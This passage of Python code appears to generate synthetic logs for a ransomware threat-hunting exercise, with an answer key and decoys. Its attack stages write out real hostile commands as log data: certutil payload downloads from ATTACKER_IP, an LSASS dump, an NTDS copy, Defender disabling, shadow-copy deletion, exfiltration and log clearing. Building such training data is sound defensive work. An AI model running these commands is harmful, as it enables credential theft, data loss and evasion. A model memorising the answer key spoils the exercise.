    b.vpn(at(0), u, ATTACKER_IP, True, geo="RO", assigned=ATTACKER_VPN_IP, stage="S01")

    # S02 RDP to the user's workstation
    b.logon(at(4), ws_host, u, ATTACKER_VPN_IP, 10, workstation="KALI", stage="S02")
    b.logon(at(4.2), "DC01", u, ws_ip, 3, workstation=ws_host, stage="S02")

    # S03 discovery
    discovery = [
        "whoami /all", "ipconfig /all", "net user /domain", 'net group "Domain Admins" /domain',
        f"nltest /dclist:{DOMAIN.lower()}", "nltest /domain_trusts", "quser", "net view /domain",
        "systeminfo", "arp -a", "tasklist /svc",
    ]
    for i, cmd in enumerate(discovery):
        exe = cmd.split()[0].lower()
        image = exe if exe.endswith(".exe") else exe + ".exe"
        b.process(at(8 + i * 1.4), ws_host, u, image if image in PATHS else "cmd.exe", cmd, "cmd.exe", stage="S03")

    # S04 tool transfer
    b.process(at(30), ws_host, u, "certutil.exe",
              rf"certutil -urlcache -split -f http://{ATTACKER_IP}:8080/upd.exe C:\Users\Public\Libraries\upd.exe",
              "cmd.exe", stage="S04")
    b.network(at(30.1), ws_host, u, "certutil.exe", ws_ip, ATTACKER_IP, 8080, stage="S04")
    b.file_create(at(30.2), ws_host, u, "certutil.exe", r"C:\Users\Public\Libraries\upd.exe", stage="S04")
    b.process(at(31), ws_host, u, "powershell.exe",
              "powershell.exe -nop -w hidden -enc " + _powershell_enc("Write-Output 'lab-simulated-stage'"),
              "cmd.exe", stage="S04")
    b.process(at(33), ws_host, u, "certutil.exe",
              rf"certutil -urlcache -split -f http://{ATTACKER_IP}:8080/svcupd.exe C:\Users\Public\Libraries\svcupd.exe",
              "cmd.exe", stage="S04")
    b.file_create(at(33.2), ws_host, u, "certutil.exe", r"C:\Users\Public\Libraries\svcupd.exe", stage="S04")

    # S05 directory enumeration against the DC over LDAP
    b.process(at(38), ws_host, u, "upd.exe", r'upd.exe -f "(objectcategory=computer)" -csv hosts.csv', "cmd.exe",
              cwd="C:\\Users\\Public\\Libraries\\", stage="S05")
    for i in range(30):
        b.network(at(38.1 + i * 0.05), ws_host, u, "upd.exe", ws_ip, SERVERS["DC01"], 389, stage="S05")
    b.file_create(at(39), ws_host, u, "upd.exe", r"C:\Users\Public\Libraries\hosts.csv", stage="S05")

    # S06 LSASS dump with comsvcs
    b.process(at(55), ws_host, u, "rundll32.exe",
              r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\debug.dmp full",
              "cmd.exe", integrity="High", stage="S06")
    b.process_access(at(55.1), ws_host, u, "rundll32.exe", "lsass.exe", "0x1fffff", stage="S06")
    b.file_create(at(55.3), ws_host, u, "rundll32.exe", r"C:\Windows\Temp\debug.dmp", stage="S06")

    # S07 Kerberoasting: a burst of RC4 tickets for several service accounts
    for i, svc in enumerate(["svc_backup", "svc_sql", "svc_iis", "svc_print", "svc_exchange"]):
        b.kerberos_tgs(at(70 + i * 0.1), u, ws_ip, svc, etype="0x17", stage="S07")

    # S08 backup service account (password cracked offline)
    b.logon_failed(at(94), "BKP01", "svc_backup", ws_ip, 3, stage="S08")
    b.logon_failed(at(94.4), "BKP01", "svc_backup", ws_ip, 3, stage="S08")
    b.logon(at(96), "BKP01", "svc_backup", ws_ip, 3, workstation=ws_host, package="NTLM", stage="S08")
    b.special_privileges(at(96.1), "BKP01", "svc_backup", stage="S08")

    # S09 domain admin from the workstation, NTDS copy, rogue admin
    for target in ("DC01", "FS01"):
        b.logon(at(125 if target == "DC01" else 128), target, "adm.tdavis", ws_ip, 10, workstation=ws_host, stage="S09")
        b.special_privileges(at(125.1 if target == "DC01" else 128.1), target, "adm.tdavis", stage="S09")
    b.process(at(132), "DC01", "adm.tdavis", "ntdsutil.exe",
              'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\n" q q', "cmd.exe", integrity="High", stage="S09")
    b.file_create(at(133), "DC01", "adm.tdavis", "ntdsutil.exe", r"C:\Windows\Temp\n\Active Directory\ntds.dit", stage="S09")
    b.security(at(136), "DC01", 4720, stage="S09", **{
        "event.category": "iam", "event.action": "user-created", "user.name": "adm.tdavis",
        "winlog.event_data.TargetUserName": "helpdesk2"})
    b.security(at(136.5), "DC01", 4728, stage="S09", **{
        "event.category": "iam", "event.action": "group-member-added", "user.name": "adm.tdavis",
        "winlog.event_data.TargetUserName": "helpdesk2",
        "winlog.event_data.GroupName": "Domain Admins"})

    # S10 Defender tampering on the file servers
    for i, host in enumerate(("FS01", "APP02", "BKP01")):
        b.process(at(160 + i * 2), host, "adm.tdavis", "powershell.exe",
                  "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true", "cmd.exe", integrity="High", stage="S10")
        b.registry(at(160.5 + i * 2), host, "adm.tdavis", "reg.exe",
                   r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", "DWORD (0x00000001)", stage="S10")

    # S11 remote service install on the file servers (staging the tooling)
    for i, host in enumerate(("FS01", "APP02", "BKP01")):
        t = at(168 + i * 1.5)
        b.logon(t, host, "adm.tdavis", ws_ip, 3, workstation=ws_host, stage="S11")
        b.file_create(t + timedelta(seconds=2), host, "adm.tdavis", "psexesvc.exe", r"C:\Windows\PSEXESVC.exe", stage="S11")
        b.service_install(t + timedelta(seconds=3), host, "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", stage="S11")

    # S12 staging and exfiltration from FS01
    b.process(at(185), "FS01", "adm.tdavis", "7z.exe",
              r"7z.exe a -mx1 -p******** C:\Windows\Temp\fin.7z D:\Shares\Finance", "cmd.exe", stage="S12")
    b.process(at(200), "FS01", "adm.tdavis", "svcupd.exe",
              r"svcupd.exe copy D:\Shares\Finance remote:harbor-bkp --transfers 16 --config C:\Users\Public\Libraries\r.conf",
              "cmd.exe", cwd="C:\\Users\\Public\\Libraries\\", stage="S12")
    exfil_end = d0 - timedelta(minutes=60)
    t = at(201)
    total = 0
    while t < exfil_end:
        b.network(t, "FS01", "adm.tdavis", "svcupd.exe", SERVERS["FS01"], EXFIL_IP, 443, stage="S12")
        if rng.random() < 0.5:
            nbytes = rng.randint(400_000_000, 900_000_000)
            total += nbytes
            b.firewall(t + timedelta(seconds=5), SERVERS["FS01"], EXFIL_IP, 443, nbytes, stage="S12")
        t += timedelta(minutes=rng.randint(2, 4))

    # S13 recovery inhibition shortly before detonation
    for i, host in enumerate(("FS01", "APP02", "BKP01")):
        t = d0 - timedelta(minutes=30 - i * 3)
        b.process(t, host, "adm.tdavis", "vssadmin.exe", "vssadmin delete shadows /all /quiet", "cmd.exe", integrity="High", stage="S13")
        b.process(t + timedelta(seconds=20), host, "adm.tdavis", "cmd.exe",
                  "wbadmin delete catalog -quiet", "cmd.exe", integrity="High", stage="S13")
        b.process(t + timedelta(seconds=40), host, "adm.tdavis", "cmd.exe",
                  "bcdedit /set {default} recoveryenabled no", "cmd.exe", integrity="High", stage="S13")
    b.process(d0 - timedelta(minutes=24), "BKP01", "adm.tdavis", "cmd.exe",
              'net stop "BackupAgent" /y', "cmd.exe", integrity="High", stage="S13")

    # S14 detonation: PsExec fan-out then mass encryption
    for i, host in enumerate(("FS01", "APP02", "BKP01")):
        t = d0 + timedelta(minutes=i * 1.2)
        b.service_install(t, host, "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", stage="S14")
        b.process(t + timedelta(seconds=4), host, "SYSTEM", "lsvc64.exe",
                  r"C:\Windows\Temp\lsvc64.exe -path D:\ -silent", "psexesvc.exe", integrity="System", stage="S14")
    b.process(d0 + timedelta(minutes=4), ws_host, u, "lsvc64.exe",
              r"C:\Windows\Temp\lsvc64.exe -path C:\Users -silent", "cmd.exe", integrity="High", stage="S14")

    extensions = ["xlsx", "docx", "pdf", "csv", "bak", "vbk", "sql", "pptx", "txt", "jpg"]
    plan = [("FS01", 1800, r"D:\Shares\{0}\{1}"), ("APP02", 400, r"D:\AppData\{0}\{1}"),
            ("BKP01", 300, r"E:\Repository\{0}\{1}"), (ws_host, 150, rf"C:\Users\{u}\{{0}}\{{1}}")]
    folders = ["Finance", "Operations", "Contracts", "Customers", "Archive", "Manifests"]
    for host, count, pattern in plan:
        start_offset = 1.0 if host != ws_host else 5.0
        dirs_seen: set[str] = set()
        for n in range(count):
            ts = d0 + timedelta(minutes=start_offset + n * (40.0 / count))
            folder = folders[n % len(folders)] + (f"\\{n // 60}" if host != ws_host else "")
            ext = extensions[n % len(extensions)]
            original = pattern.format(folder, f"file_{n:04d}.{ext}")
            b.file_create(ts, host, "SYSTEM" if host != ws_host else u, "lsvc64.exe", original + ".hlq1x", stage="S14")
            dirname = ntpath.dirname(original)
            if dirname not in dirs_seen:
                dirs_seen.add(dirname)
                b.file_create(ts, host, "SYSTEM" if host != ws_host else u, "lsvc64.exe",
                              dirname + r"\README_HLQ1X_RESTORE.txt", stage="S14")
        b.registry(d0 + timedelta(minutes=start_offset + 41), host, "SYSTEM", "lsvc64.exe",
                   r"HKCU\Control Panel\Desktop\Wallpaper", r"C:\Windows\Temp\hlq1x.bmp", stage="S14")

    # S15 log clearing
    for i, host in enumerate(("FS01", "APP02", "BKP01", "DC01")):
        t = d0 + timedelta(minutes=48 + i)
        b.process(t, host, "adm.tdavis", "wevtutil.exe", "wevtutil cl Security", "cmd.exe", integrity="High", stage="S15")
        b.process(t + timedelta(seconds=10), host, "adm.tdavis", "wevtutil.exe", "wevtutil cl System", "cmd.exe", integrity="High", stage="S15")
        b.security(t + timedelta(seconds=12), host, 1102, stage="S15", **{
            "event.category": "iam", "event.action": "audit-log-cleared", "user.name": "adm.tdavis"})

    # Aftermath (responders and affected users), not part of the attack chain.
    aft = d0 + timedelta(hours=6)
    b.add(aft, {"host.name": "vpn-gw01", "event.dataset": "vpn.auth", "event.provider": "vpn-gateway",
                "event.category": "authentication", "event.action": "vpn-login-failed", "event.outcome": "failure",
                "user.name": u, "source.ip": ATTACKER_IP, "source.geo.country_iso_code": "RO"})
    b.security(aft + timedelta(minutes=1), "DC01", 4725, **{
        "event.category": "iam", "event.action": "user-disabled", "user.name": "adm.tdavis",
        "winlog.event_data.TargetUserName": u})
    for i, (host, ip, user) in enumerate(_workstations()[:6]):
        b.process(aft + timedelta(minutes=20 + i * 4), host, user, "notepad.exe",
                  r"notepad.exe C:\Users\Public\README_HLQ1X_RESTORE.txt", "explorer.exe")

    return {"a0": a0, "d0": d0}


# ----------------------------------------------------------------------- API


def generate(end: datetime | None = None, seed: int = SEED) -> tuple[list[dict[str, object]], list[dict[str, str]], dict[str, str]]:
    """Return ``(documents, truth, meta)`` with timestamps relative to ``end``."""
    if end is None:
        end = datetime.now(timezone.utc)
    end = end.astimezone(timezone.utc).replace(minute=0, second=0, microsecond=0)
    start = end - timedelta(days=DAYS)
    b = Builder(seed)
    _baseline(b, start)
    _background(b, start)
    marks = _attack(b, start)
    b.docs.sort(key=lambda pair: pair[0])
    docs = [doc for ts, doc in b.docs if start <= ts <= end]
    kept = {d["event"]["id"] for d in docs}  # type: ignore[index]
    truth = [t for t in b.truth if t["event_id"] in kept]
    meta = {
        "scenario": SCENARIO_ID,
        "start": _iso(start),
        "end": _iso(end),
        "attack_start": _iso(marks["a0"]),
        "detonation": _iso(marks["d0"]),
        "documents": str(len(docs)),
        "attack_events": str(len(truth)),
    }
    return docs, truth, meta


def answer_key_markdown(truth: list[dict[str, str]], meta: dict[str, str]) -> str:
    by_stage: dict[str, list[dict[str, str]]] = defaultdict(list)
    for row in truth:
        by_stage[row["stage"]].append(row)
    lines = [
        "# Answer key: ransomware intrusion at Harborline Logistics (synthetic)",
        "",
        f"Data window: {meta['start']} to {meta['end']} (UTC)",
        f"Attacker first VPN login: {meta['attack_start']}",
        f"Ransomware detonation: {meta['detonation']}",
        f"Total documents: {meta['documents']}, of which attack events: {meta['attack_events']}",
        "",
        "| Stage | What happens | First seen (UTC) | Last seen (UTC) | Events | Hosts |",
        "|---|---|---|---|---|---|",
    ]
    for stage in sorted(by_stage):
        rows = by_stage[stage]
        hosts = ", ".join(sorted({r["host"] for r in rows}))
        lines.append(
            f"| {stage} | {STAGE_TITLES[stage]} | {min(r['timestamp'] for r in rows)} | "
            f"{max(r['timestamp'] for r in rows)} | {len(rows)} | {hosts} |"
        )
    lines += [
        "",
        "Decoys (look suspicious, are routine): a vendor VPN login from a new address, a developer",
        "running certutil -hashfile, the IT admin installing the PsExec service on APP02 while patching,",
        "and a legacy app server requesting RC4 tickets for its SQL service account.",
        "",
    ]
    return "\n".join(lines)
